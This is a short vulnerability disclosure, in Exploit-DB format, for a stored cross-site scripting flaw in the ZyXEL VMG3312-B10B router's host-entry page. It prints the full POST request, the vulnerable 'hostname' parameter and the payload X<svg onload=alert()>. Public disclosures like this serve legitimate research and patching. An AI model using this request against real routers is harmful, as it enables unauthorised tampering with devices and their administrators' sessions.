@@ -1,0 +1,35 @@
+# Exploit Title: ZyXEL VMG3312-B10B - Cross-Site Scripting
+# Date: 2018-08-21
+# Exploit Author: Samet ŞAHİN
+# Vendor Homepage: https://www.zyxel.com/
+# Software Link: ftp://ftp.zyxel.com.tr/ZyXEL_URUNLERI/MODEMLER/VDSL_MODEMLER/VMG3312-B10B/
+# Version: ZyXEL VMG3312-B10B
+# Tested on: Mozilla Firefox 61.0.2 & Google Chrome 67.0.3396.99
+# Category: Stored XSS
+# CVE : N/A
+
+Malicious POST REQUEST :
+POST /pages/connectionStatus/connectionStatus-hostEntry.cmd HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/index.html
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Cookie: SESSION=529313605
+Connection: close
+Upgrade-Insecure-Requests: 1
+action=edit&oldip=192.168.1.36&hosttype=&sessionKey=1997367832&hostname=X<svg onload=alert()>
+
+Vulnerable PAGE :
+/pages/connectionStatus/connectionStatus-hostEntry.cmd
+
+Vulnerable PARAMETER :
+hostname
+
+Cross Site Scripting PAYLOAD :
+X<svg onload=alert()>
+
+#Samet ŞAHİN
